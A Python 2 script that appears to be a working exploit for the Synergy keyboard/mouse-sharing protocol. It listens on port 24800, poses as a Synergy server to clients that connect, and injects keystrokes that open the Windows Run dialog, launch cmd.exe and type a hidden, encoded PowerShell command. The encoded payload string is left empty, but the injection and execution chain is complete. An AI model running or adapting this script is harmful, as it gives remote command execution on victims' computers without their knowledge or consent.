import sys
import time
import socket
from thread import *

payload = "powershell.exe -NoP -sta -NonI -W Hidden -Enc "


def start_listener(port):

    host = ''   # Symbolic name meaning all available interfaces
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'Socket created'
    # Bind socket to local host and port
    try:
        s.bind((host, port))
    except socket.error as msg:
        print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()
    print 'Socket bind complete'
    # Start listening on socket
    s.listen(10)
    print 'Socket now listening'
    return s


def establish_connection(conn):

    # Function for handling connections. This will be used to create threads
    conn.send('\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x06')  # send version
    data = conn.recv(1024)
    print "Hostname: " + data[19:]
    conn.send('\x00\x00\x00\x04\x51\x49\x4e\x46')  # query screen info
    conn.send('\x00\x00\x00\x04\x43\x49\x41\x4b')  # send resolution change acknowledgement
    time.sleep(1)
    # send reset options
    conn.send('\x00\x00\x00\x04\x43\x52\x4f\x50\x00\x00\x00\x68\x44\x53\x4f\x50\x00\x00\x00\x18\x48\x44\x43\x4c\x00\x00'
              '\x00\x00\x48\x44\x4e\x4c\x00\x00\x00\x00\x48\x44\x53\x4c\x00\x00\x00\x00\x53\x53\x43\x4d\x00\x00\x00\x00'
              '\x53\x53\x43\x53\x00\x00\x00\x00\x58\x54\x58\x55\x00\x00\x00\x00\x43\x4c\x50\x53\x00\x00\x00\x01\x4d\x44'
              '\x4c\x54\x00\x00\x00\x00\x53\x53\x43\x4d\x00\x00\x00\x00\x53\x53\x43\x53\x00\x00\x00\x00\x53\x53\x56\x52'
              '\x00\x00\x00\x01\x5f\x4b\x46\x57\x00\x00\x00\x00')
    time.sleep(1)
    print "Entering Screen..."
    conn.send('\x00\x00\x00\x0e\x43\x49\x4e\x4e\x00\x00\x00\x8c\x00\x00\x00\x01\x00\x00')  # enter the client screen
    time.sleep(1)


def open_cmd(conn):
    print "Opening the command prompt..."
    conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\xef\xeb\x00\x10\x01\x5b')  # send windows key
    conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\x00\x72\x00\x10\x00\x13')  # send r
    conn.send('\x00\x00\x00\x0a\x44\x4b\x55\x50\xef\xeb\x00\x00\x01\x5b')  # release windows key
    time.sleep(1)
    command = "cmd.exe"
    i = 0

    while i < len(command):
        conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\x00' + command[i] + '\x00\x00\x00\x21')  # send cmd.exe
        i += 1
        time.sleep(.1)
    conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\xef\x0d\x00\x00\x00\x1c')  # send enter
    time.sleep(1)


def send_payload(conn, payload):
    i = 0
    print "Sending payload..."
    while i < len(payload):
        conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\x00' + payload[i] + '\x00\x00\x00\x21')  # send payload
        i += 1
        time.sleep(.001)
    print "Payload sent!"


def windows_shell(conn):
    establish_connection(conn)
    open_cmd(conn)
    send_payload(conn, payload)

s = start_listener(24800)

while 1:
    conn, addr = s.accept()
    print 'Connected with ' + addr[0] + ':' + str(addr[1])
    start_new_thread(windows_shell, (conn,))


s.close()
